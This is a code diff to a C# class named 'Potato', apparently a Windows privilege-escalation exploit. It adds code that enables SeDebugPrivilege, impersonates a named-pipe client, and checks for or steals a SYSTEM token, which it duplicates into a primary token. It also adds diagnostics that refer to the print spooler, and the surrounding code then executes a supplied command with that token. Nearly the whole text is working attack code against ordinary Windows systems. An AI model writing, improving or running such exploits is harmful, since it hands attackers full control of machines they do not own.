@@ -43,8 +43,19 @@ public class Potato
     static extern bool GetTokenInformation(IntPtr tok, int cls, IntPtr buf, int len, out int rlen);
     [DllImport("advapi32.dll", SetLastError = true)]
     static extern bool ConvertSidToStringSidW(IntPtr sid, out IntPtr str);
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool OpenThreadToken(IntPtr th, uint da, bool self, out IntPtr tok);
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TP newState, int bufLen, IntPtr prev, IntPtr retLen);
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    static extern bool LookupPrivilegeValueW(string sys, string name, out long luid);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentThread();
     [DllImport("kernel32.dll")]
     static extern IntPtr LocalFree(IntPtr h);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct TP { public int Count; public long Luid; public int Attr; }
 
     [DllImport("userenv.dll", SetLastError = true)]
     static extern bool CreateEnvironmentBlock(out IntPtr env, IntPtr token, bool inherit);
@@ -121,6 +132,20 @@ public class Potato
     }
 
     static string _lastDiag = "";
+    static string _pipeDiag = "";
+
+    static bool EnableDebugPriv()
+    {
+        IntPtr tok;
+        if (!OpenThreadToken(GetCurrentThread(), 0x0020 | 0x0008, false, out tok)) return false;
+        long luid;
+        if (!LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
+        { CloseHandle(tok); return false; }
+        var tp = new TP { Count = 1, Luid = luid, Attr = 2 };
+        bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+        CloseHandle(tok);
+        return ok && Marshal.GetLastWin32Error() == 0;
+    }
 
     static IntPtr FindSystemTokenViaHandles()
     {
@@ -198,6 +223,8 @@ public class Potato
             {
                 if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                 lastProcHandle = OpenProcess(0x0440, false, (int)pid);
+                if (lastProcHandle == IntPtr.Zero)
+                    lastProcHandle = OpenProcess(0x0040, false, (int)pid);
                 lastPid = (int)pid;
                 if (lastProcHandle != IntPtr.Zero) opened++;
             }
@@ -245,15 +272,46 @@ public class Potato
 
         if (ImpersonateNamedPipeClient(hp))
         {
-            IntPtr sysToken = FindSystemTokenViaHandles();
-            if (sysToken != IntPtr.Zero)
-            { _sysToken = sysToken; _got = true; }
+            string pipeId = WindowsIdentity.GetCurrent().Name;
+            _pipeDiag = "pipeClient=" + pipeId;
+
+            IntPtr threadTok;
+            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out threadTok))
+            {
+                string sid = GetTokenSid(threadTok);
+                if (sid == "S-1-5-18")
+                {
+                    IntPtr primary;
+                    if (DuplicateTokenEx(threadTok, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
+                    {
+                        _sysToken = primary; _got = true;
+                        _pipeDiag += ",directToken=SYSTEM";
+                    }
+                    CloseHandle(threadTok);
+                }
+                else
+                {
+                    CloseHandle(threadTok);
+                    bool dbg = EnableDebugPriv();
+                    _pipeDiag += ",debugPriv=" + (dbg ? "enabled" : "unavail");
+
+                    IntPtr sysToken = FindSystemTokenViaHandles();
+                    _pipeDiag += ",imp_" + _lastDiag;
+                    if (sysToken != IntPtr.Zero)
+                    { _sysToken = sysToken; _got = true; }
+                }
+            }
             RevertToSelf();
+        }
+        else
+        {
+            _pipeDiag = "impersonateFailed=" + Marshal.GetLastWin32Error();
         }
 
         if (!_got)
         {
             IntPtr sysToken = FindSystemTokenViaHandles();
+            _pipeDiag += ",noImp_" + _lastDiag;
             if (sysToken != IntPtr.Zero)
             { _sysToken = sysToken; _got = true; }
         }
@@ -369,7 +427,8 @@ public class Potato
             if (!_got)
             {
                 string id = WindowsIdentity.GetCurrent().Name;
-                return "FAIL:NO_SYSTEM_TOKEN|svc=" + id + "|spooler=" + (spoolerRunning ? "up" : "down") + "|" + diag + _lastDiag;
+                return "FAIL:NO_SYSTEM_TOKEN|svc=" + id + "|spooler=" + (spoolerRunning ? "up" : "down")
+                    + "|" + diag + "|pipe:" + _pipeDiag + "|direct:" + _lastDiag;
             }
 
             string result = Exec(cmd);
